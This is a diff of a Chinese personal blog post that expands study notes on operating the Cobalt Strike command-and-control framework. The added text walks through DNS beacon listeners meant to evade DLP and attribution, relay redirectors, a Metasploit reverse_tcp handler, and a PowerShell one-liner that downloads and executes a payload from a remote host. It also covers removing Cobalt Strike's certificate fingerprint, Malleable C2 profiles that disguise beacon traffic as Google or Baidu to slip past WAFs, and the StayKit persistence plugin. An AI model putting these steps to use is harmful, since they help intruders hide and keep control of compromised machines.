@@ -8,7 +8,7 @@
   
   
   
-  <title>CobaltStrike | JohnScott2046的博客</title>
+  <title>49CobaltStrike | JohnScott2046的博客</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -254,12 +254,12 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>CobaltStrike</span>
+    <span>49CobaltStrike</span>
   </h1>
   <div class="article-top-meta">
     <span>
       发布 : 
-      2021-12-01
+      2021-12-12
     </span>
     
       <span>
@@ -307,18 +307,22 @@
 </ol>
 <p>监听器管理功能支持重定向。当设置HTTP/HTTPS Beacon监听器时，重定向跳板机IP。<br>如果提供的Host不属于当前主机（不是团队服务器的IP），CS就假设它是重定向器。 </p>
 <p>可以使用socat工具将服务器转变为重定向器，将跳板机80端口上的所有连接转发到的团队服务器IP的80端口<br>跳板机 socat TCP4-LISTEN:80,fork TCP4:[团队服务器]:80</p>
-<h4 id="dns-beacon"><a href="#dns-beacon" class="headerlink" title="dns beacon"></a>dns beacon</h4><ol>
-<li>团队服务端，配置域名，开放50050端口和53端口</li>
+<h4 id="dns-beacon"><a href="#dns-beacon" class="headerlink" title="dns beacon"></a>dns beacon</h4><p>红蓝对抗中，可以通过DNS的方式通信，流量更加隐秘，躲避agent/DLP的检测，实现相对隐秘的渗透方式，反溯源</p>
+<p>申请免费域名 <a target="_blank" rel="noopener" href="http://www.dot.tk/en/index.html?lang=en">http://www.dot.tk/en/index.html?lang=en</a></p>
+<ol>
+<li>团队服务端，配置域名，开放50050端口和53端口的TCP和UDP 必须</li>
 <li>在域名解析，添加NS记录，主机记录例如dns、dns1、dns2，记录值是当前域名，NS记录就是将解析任务交由一个指定的权威dns服务器(在这里teamserver就是我们的权威dns)</li>
-<li>add listener<br>=&gt; name<br>=&gt; payload: beacon dns<br>=&gt; dns hosts: dns.域名、dns1.域名、dns2.域名<br>=&gt; dns hosts(stager): dns.域名</li>
+<li>add listener<br>=&gt; name<br>=&gt; payload: beacon dns<br>=&gt; dns hosts: dns.域名、dns1.域名、dns2.域名<br>=&gt; dns hosts(stager): dns.域名<br>=&gt; host rotation strategy: round-robin</li>
 </ol>
 <h4 id="重定器"><a href="#重定器" class="headerlink" title="重定器"></a>重定器</h4><p>add listener<br>payload: beacon http<br>http hosts: 跳板机1,跳板机2,跳板机3<br>host rotation strategy: round-robin<br>http host(strategy): 团队服务器<br>profile: default<br>http port(c2): 80</p>
 <p>然后生成一个shell到目标机器执行，可以看到目标机器连接的是跳板机的ip<br>netstat -ano</p>
 <h3 id="获取到会话后反弹给msf"><a href="#获取到会话后反弹给msf" class="headerlink" title="获取到会话后反弹给msf"></a>获取到会话后反弹给msf</h3><p>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.1.230<br>set lport 5555<br>exploit -j  -j后台监听或者run</p>
-<p>Linux上线教程如下 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/t9a4g7j4EJ4q-nnNRc-WZQ">https://mp.weixin.qq.com/s/t9a4g7j4EJ4q-nnNRc-WZQ</a><br>Linux 记得使用 shell + 命令</p>
+<h3 id="上线Linux"><a href="#上线Linux" class="headerlink" title="上线Linux"></a>上线Linux</h3><p>Linux上线教程 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/t9a4g7j4EJ4q-nnNRc-WZQ">https://mp.weixin.qq.com/s/t9a4g7j4EJ4q-nnNRc-WZQ</a> </p>
+<p><a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a></p>
+<h3 id="修改客户端端口"><a href="#修改客户端端口" class="headerlink" title="修改客户端端口"></a>修改客户端端口</h3><p>修改 teamserver 中的server_port</p>
 <h3 id="参数详情"><a href="#参数详情" class="headerlink" title="参数详情"></a>参数详情</h3><p>New Connection  新建连接，支持连接多个服务器端<br>Preferences  设置 Cobal Strike 界面、控制台、以及输出报告样式、TeamServer 连接记 录</p>
 <p>Visualization  主要展示输出结果的视图<br>VPN Interfaces  设置 VPN 接口<br>Listenrs  创建监听器<br>Script Manager  脚本管理，可以通过 AggressorScripts 脚本来加强自身，能够扩展菜单栏，Beacon 命令行，提权脚本等<br>Close  退出连接 </p>
-<p>View Applications  显示受害主机的应用信息<br>Credentials  显示所有以获取的受害主机的凭证，如 hashdump、Mimikatz<br>Downloads  查看已下载文件<br>Event Log  主机上线记录以及团队协作聊天记录<br>Keystrokes  查看键盘记录结果 </p>
+<p>View Applications  显示受害主机的应用信息<br>Credentials  显示所有以获取的受害主机的凭证，如 hashdump、 Mimikatz<br>Downloads  查看已下载文件<br>Event Log  主机上线记录以及团队协作聊天记录<br>Keystrokes  查看键盘记录结果 </p>
 <p>Proxy Pivots  查看代理模块<br>Screenshots  查看所有屏幕截图<br>Script Console  加载第三方脚本以增强功能<br>Targets  显示所有受害主机<br>Web Log  所有Web服务的日志</p>
 <p>Attacks<br>Packages<br>HTML Application  生成(executable/VBA/powershell)这三种原理实现的恶意 HTA 木马 文件MS<br>Office Macro  生成office宏病毒文件<br>Payload Generator  生成各种语言版本的 payload<br>USB/CD AutoPlay  生成利用自动播放运行的木马文件<br>Windows Dropper  捆绑器能够对任意的正常文件进行捆绑(免杀效果差)<br>Windows Executable  生成可执行 exe 木马<br>Windows Executable(Stageless)  生成无状态的可执行 exe 木马</p>
 <p>Web Drive-by<br>Manage  对开启的web服务进行管理<br>Clone Site  克隆网站，可以记录受害者提交的数据<br>Host File  提供文件下载，可以选择Mime类型<br>Scripted Web Delivery  为payload提供 web 服务以便下载和执行，类似于 Metasploit 的 web_delivery<br>Signed Applet Attack  使用java自签名的程序进行钓鱼攻击(该方法已过时)<br>Smart Applet Attack  自动检测java版本并进行攻击，针对 Java 1.6.0_45 以下以及 Java 1.7.0_21 以下版本(该方法已过时) System Profiler用来获取系统信息，如系统版本，Flash 版本，浏览器版本等<br>Spear Phish  鱼叉钓鱼邮件</p>
@@ -327,6 +331,51 @@
 <p>创建监听器<br>CobaltStrike 的内置监听器为Beacon，外置监听器为Foreign<br>CobaltStrike 的Beacon支持异步通信 和 交互式通信</p>
 <p>点击左上方 CobaltStrike 选项——&gt;在下拉框中选择 Listeners ——&gt;在下方弹出区域中单机 add CobaltStrike4.0 </p>
 <p>目前有以下8种Payload选项：<br>name：为监听器名字，可任意<br>payload：payload 类型<br>HTTP Hosts: shell 反弹的主机，也就是我们 kali 的 ip<br>HTTP Hosts(Stager): Stager 的马请求下载 payload 的地址<br>HTTP Port(C2): C2 监听的端口</p>
+<p>创建一个监听器<br>scripted web delivery<br>powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.1.230/a&#39;))&quot;">http://192.168.1.230:80/a&#39;))&quot;</a></p>
+<h3 id="Cobaltstrike去除特征"><a href="#Cobaltstrike去除特征" class="headerlink" title="Cobaltstrike去除特征"></a>Cobaltstrike去除特征</h3><ol>
+<li>更改默认端口</li>
+</ol>
+<p>直接编辑teamserver文件</p>
+<ol start="2">
+<li>去除证书特征</li>
+</ol>
+<p>进入目录， 查看证书情况</p>
+<p>keytool -list -v -keystore cobaltstrike.store</p>
+<p>输入默认密码123456 可以看到所有者、发布者中的cobaltstrike单词</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Alias name: cobaltstrike</span><br><span class="line">Creation date: Mar 17, 2019</span><br><span class="line">Entry type: PrivateKeyEntry</span><br><span class="line">Certificate chain length: 1</span><br><span class="line">Certificate[1]:</span><br><span class="line">Owner: CN&#x3D;Major Cobalt Strike, OU&#x3D;AdvancedPenTesting, O&#x3D;cobaltstrike, L&#x3D;Somewhere, ST&#x3D;Cyberspace, C&#x3D;Earth</span><br><span class="line">Issuer: CN&#x3D;Major Cobalt Strike, OU&#x3D;AdvancedPenTesting, O&#x3D;cobaltstrike, L&#x3D;Somewhere, ST&#x3D;Cyberspace, C&#x3D;Earth</span><br><span class="line">Serial number: 48c38a7f</span><br><span class="line">Valid from: Sun Mar 17 01:39:31 CST 2019 until: Sat Jun 15 01:39:31 CST 2019</span><br><span class="line">Certificate fingerprints:</span><br><span class="line">     SHA1: 59:C8:D6:0F:0F:4B:6B:61:AD:DE:CF:3B:D3:B2:9B:72:E9:1A:31:6C</span><br><span class="line">     SHA256: 7B:49:FC:58:9E:7E:73:8E:34:57:85:9D:26:99:96:EC:EF:83:F6:93:57:0B:0A:C4:82:C4:26:B1:FA:04:BD:73</span><br><span class="line">Signature algorithm name: SHA256withRSA</span><br><span class="line">Subject Public Key Algorithm: 2048-bit RSA key</span><br><span class="line">Version: 3</span><br><span class="line"></span><br><span class="line">Extensions: </span><br><span class="line"></span><br><span class="line">#1: ObjectId: 2.5.29.14 Criticality&#x3D;false</span><br><span class="line">SubjectKeyIdentifier [</span><br><span class="line">KeyIdentifier [</span><br><span class="line">0000: 7E 80 01 F2 F6 C1 53 51   89 52 36 55 BB 92 D9 99  ......SQ.R6U....</span><br><span class="line">0010: A1 C2 39 10                                        ..9.</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*******************************************</span><br><span class="line">*******************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning:</span><br><span class="line">The JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard format using &quot;keytool -importkeystore -srckeystore cobaltstrike.store -destkeystore cobaltstrike.store -deststoretype pkcs12&quot;.</span><br></pre></td></tr></table></figure>
+
+<p>修改 keytool，这是一个Java数据证书的管理工具，使用如下：</p>
+<p>keytool -keystore cobaltstrike.store -storepass 密码<br>    -keypass 密码<br>    -genkey -keyalg RSA<br>    -alias google.com -dname “CN=(名字与姓氏),OU=(组织单位名称), O=(组织名称),    L=(城市或区域名称),ST=(州或省份名称),C=(单位的两字母国家代码)。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias qq -dname &quot;CN&#x3D;Jhon, OU&#x3D;Advanced, O&#x3D;Chrome, L&#x3D;Somewhere, S&#x3D;Cyberspace, C&#x3D;Earth&quot;</span><br></pre></td></tr></table></figure>
+
+<p>最后通过如下命令载入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -srckeystore .&#x2F;cobaltstrike.store -destkeystore .&#x2F;cobaltstrike.store -deststoretype pkcs12</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>绕过流量审计</li>
+</ol>
+<p>传输过程中，把流量伪造成高信誉的网站，比如Google、baidu等</p>
+<p>现在的大多数硬件WAF防护设备都能检测出来Cs的流量特征，CS的流量由malleable C2配置来掌控的，所以需要定向去配置这个C2。</p>
+<p>下载Malleable配置文件 <a href="https://github.com/xx0hcd/Malleable-C2-Profiles">https://github.com/xx0hcd/Malleable-C2-Profiles</a></p>
+<p>将配置文件上传到cs目录下</p>
+<p>C2lint是Cobalt Strike中提供的工具，用于测试配置文件中的错误</p>
+<p>./c2lint c2lint jquery-c2.3.11.profile</p>
+<p>./teamserver ip 密码 jquery-c2.3.11.profile</p>
+<p>Malleable C2 是一种特定领域的语言，主要用来控制“Cobalt Strike Beacon”攻击载荷中的网<br>络指针。</p>
+<p>Beacon与teamserver端c2的通信逻辑</p>
+<ol>
+<li>stager的beacon会先下载完整的payload执行</li>
+<li>beacon进入睡眠状态，结束睡眠状态后用 http-get方式 发送一个metadata(具体发送细节可以<br>在malleable_profie文件里的http-get模块进行自定义),metadata内容大概是目标系统的版本，当<br>前用户等信息给teamserver端 。如图的 1）</li>
+<li>如果存在待执行的任务，则teamserver上的c2会响应这个metadata发布命令。beacon将会收<br>到具体会话内容与一个任务id。</li>
+<li>执行完毕后beacon将回显数据与任务id用post方式发送回team server端的C2(细节可以在<br>malleable_profile文件中的http-post部分进行自定义)，然后又会回到睡眠状态。</li>
+</ol>
+<p>许多 Beacon 指标由一个 C2 拓展文件控制。一个 C2 拓展文件由设置和数据转换组成。数据转换<br>是一 个简单的程序，它指定如何转换数据并将其存储在事务中。转换和存储数据的同一程序，向<br>后解释，还 从事务中提取和恢复数据。</p>
+<h3 id="StayKit插件"><a href="#StayKit插件" class="headerlink" title="StayKit插件"></a>StayKit插件</h3><p>StayKit 是 Cobalt Strike 持久性的扩展，它利用 SharpStay .NET 程序集的 execute_assembly 函数。攻击者脚本通过读取特定执行类型的模板文件来处理有效负载的创建。</p>
+<p>重要提示：要使用脚本，用户只需要加载StayKit.cna攻击者脚本。此外，需要编译SharpStayStayKit.cna程序集并将其放入所在的目录中。最后，如果为有效负载选择模板，有些可能需要使用 Mono 的动态编译。</p>
+<p>持久性菜单将添加到信标。由于每种技术的性质不同，因此只有一个 GUI 菜单，没有信标命令。</p>
+<p><a href="https://github.com/0xthirteen/StayKit">https://github.com/0xthirteen/StayKit</a></p>
+<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>提升注册表项<br>用户注册密钥<br>UserInitMprLogonScriptKey<br>提升用户初始化密钥<br>计划任务<br>列出计划任务<br>ScheduledTaskAction<br>SchTaskCOM劫持<br>创建服务<br>列出运行服务<br>WMIEventSub<br>GetScheduledTaskCOMHandler<br>连接文件夹<br>启动目录<br>新LNK<br>后门LNK<br>列出任务名称</p>
+<p>sleep 5  每5秒检测是否在线</p>
 
     </div>
   </div>
@@ -430,7 +479,7 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2021/shell/" target="_self">shell</a>
+        <a href="/2021/48PWN/" target="_self">48PWN</a>
       </div>
     
     
